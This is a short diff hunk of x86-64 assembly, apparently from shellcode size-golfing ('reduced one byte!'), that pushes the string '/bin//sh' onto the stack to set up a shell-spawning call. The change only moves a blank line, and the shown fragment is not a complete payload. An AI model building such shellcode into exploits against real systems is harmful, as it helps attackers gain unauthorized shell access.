@@ -22,9 +22,9 @@ mov ah, 0x01 ; reduced one byte!
 
 cqo
 push rdx
+
 mov rdi, 0x68732f2f6e69622f
 push   rdi
-
 push rsp
 pop  rsi
 
